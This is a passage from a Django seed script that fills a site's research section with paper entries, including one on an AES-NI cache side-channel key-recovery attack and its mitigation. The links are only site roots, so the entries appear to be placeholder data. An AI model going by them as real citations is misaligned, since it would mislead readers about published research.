                    'vulnerabilities, outperforming Mythril, Slither, and Echidna.'
                ),
                'venue': 'ACM CCS 2025 — Conference on Computer and Communications Security',
                'published_at': datetime.date(2025, 11, 4),
                'publication_url': 'https://dl.acm.org',
                'tags': [('Blockchain', 'yellow'), ('Smart Contracts', 'blue'), ('Symbolic Execution', 'purple'), ('Fuzzing', 'red')],
                'is_featured': True,
                'order': 1,
            },
            {
                'title': 'Side-Channel Resistance of AES-NI Implementations on Modern x86 Processors',
                'authors': 'Md Abu Saeed, Prof. Shamim Akhter, Kamrul Hasan',
                'abstract': (
                    'Hardware AES-NI instructions are widely assumed to be immune to cache-timing side-channel '
                    'attacks due to constant-time execution guarantees. This work challenges that assumption by '
                    'demonstrating a cross-core L1 cache contention attack on AES-NI in hyper-threaded environments '
                    'running Intel Xeon Scalable processors. We achieve full AES-128 key recovery in under 40 minutes '
                    'using 2^22 observed encryptions from an unprivileged co-resident process. We further propose '
                    'a microarchitectural mitigation using cache-partitioning via Intel CAT (Cache Allocation '
                    'Technology) that eliminates the leakage channel with less than 2% throughput overhead.'
                ),
                'short_description': (
                    'Demonstrates a cross-core cache contention attack on AES-NI achieving full key recovery, '
                    'and proposes an Intel CAT mitigation with under 2% overhead.'
                ),
                'venue': 'USENIX Security 2025',
                'published_at': datetime.date(2025, 8, 13),
                'publication_url': 'https://usenix.org',
                'tags': [('Side-Channel', 'red'), ('Cryptography', 'blue'), ('Hardware Security', 'gray'), ('AES', 'green')],
                'is_featured': True,
                'order': 2,
            },
        ]
        for item in data:
            tags = item.pop('tags')
            paper = ResearchPaper.objects.create(**item)
            for tag_name, color in tags:
                tag, _ = ResearchTag.objects.get_or_create(name=tag_name, defaults={'color': color})
                paper.tags.add(tag)
        self.stdout.write('  [ok] Research papers created (3)')
